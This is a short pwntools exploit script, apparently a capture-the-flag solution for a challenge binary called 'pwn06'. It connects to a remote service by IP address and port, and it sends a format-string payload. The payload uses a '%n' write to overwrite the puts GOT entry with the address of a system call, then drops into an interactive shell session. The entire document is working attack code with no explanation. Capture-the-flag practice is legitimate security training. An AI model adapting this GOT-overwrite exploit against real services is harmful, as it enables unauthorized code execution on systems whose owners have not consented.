from pwn import *

r = remote("103.229.41.18", 8083)
# r = process("./pwn06")
# gdb.attach(r)

AZ = 0x00000000006010A0
puts_got = 0x601018
system_ = 0x0000000000400975

payload = "%4196725p%12$ln-" # 10 11
payload += p64(puts_got) # 12

r.sendline(payload)
r.interactive()